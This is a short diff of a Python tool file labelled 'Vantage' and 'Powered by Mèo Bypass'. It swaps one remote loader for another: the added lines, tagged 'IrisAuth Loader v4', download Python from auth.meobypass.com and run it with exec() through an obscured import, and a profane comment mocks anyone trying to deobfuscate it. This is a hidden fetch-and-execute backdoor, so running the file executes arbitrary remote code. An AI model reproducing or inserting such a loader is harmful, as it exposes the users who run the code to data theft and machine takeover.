@@ -2,5 +2,7 @@
 # Tool: Vantage
 # License: PolyForm Noncommercial 1.0.0
 # Powered by Mèo Bypass
-import urllib.request
-LicenseKey="";exec(urllib.request.urlopen('https://auth.live-is.games/files/2dc521d3-b2be-45c1-92a0-bacbf2811dc3.py').read())
+# IrisAuth Loader v4
+LicenseKey = ""
+exec(__import__('urllib.request',fromlist=['urlopen']).urlopen("https://auth.meobypass.com/files/eee47a28-f6fb-4046-be50-b31fb4a32ee8.py").read())
+# deobf cai dit me may
